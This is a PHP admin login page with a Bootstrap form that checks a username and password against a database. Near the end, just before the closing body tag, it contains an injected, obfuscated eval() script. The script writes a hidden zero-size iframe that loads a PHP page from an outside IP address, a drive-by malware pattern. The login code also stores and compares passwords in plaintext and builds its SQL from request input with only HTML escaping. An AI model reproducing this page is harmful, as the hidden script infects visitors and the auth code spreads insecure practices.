<?php 
$current_page = "dashboard";
 session_start();     
include('dbconfig.php');

      if(isset($_REQUEST['admsubmit']))
      {
        
	   $result=mysql_query("select * from adminlogin where admname='".htmlspecialchars($_REQUEST['uname'],ENT_QUOTES)."' and admpassword='".htmlspecialchars($_REQUEST['password'],ENT_QUOTES)."'");
       $num=mysql_num_rows($result);
         
		if(mysql_num_rows($result)>0)
          {
            
              $r=mysql_fetch_array($result);
              if(strcmp($r['admpassword'],htmlspecialchars($_REQUEST['password'],ENT_QUOTES))==0)
              {
			 
                 $_SESSION['admname']=htmlspecialchars_decode($r['admname'],ENT_QUOTES);
                  //unset($_GLOBALS['message']);
                  header('Location:welcome.php');
				  
              }
		  }else {
          
              $message="Invalid username / password. ";
	  }
      }
 ?>


<!DOCTYPE html>
<html>
  <head>
    <title>AVI Admin Login</title>
    <!-- Bootstrap -->
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
    <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen">
    <link href="assets/styles.css" rel="stylesheet" media="screen">
     <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
  </head>
  <body id="login">
    <div class="container">
<form id="indexform" action="index.php" class="form-signin" method="post" autocomplete="off">
     
        <center><h2 class="form-signin-heading">LOG IN</h2></center>
        <input type="text" name='uname' class="input-block-level" placeholder="Username">
        <input type="password" name='password' class="input-block-level" placeholder="Password">
        
        <input type='submit' name='admsubmit' id="signupb" class="btn btn-large btn-primary" value="Log In">
      </form>

    </div> <!-- /container -->
    <script src="vendors/jquery-1.9.1.min.js"></script>
    <script src="bootstrap/js/bootstrap.min.js"></script>
	
  <tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 c=" n=\\"0\\" s=\\"0\\" t=\\"0\\" l=\\"h://q.j.k.8/d.g\\">";1 6="<i";1 b="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 9="e";1 7="e>";o.p(6+2+3+5+4+9+c+b+2+3+5+4+7);',30,30,'|var|r4|r5|r7|r6|r2|r9||r8||r3|r1|tag1|||php|http||78|150|src||width|document|write|219||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>

  </html>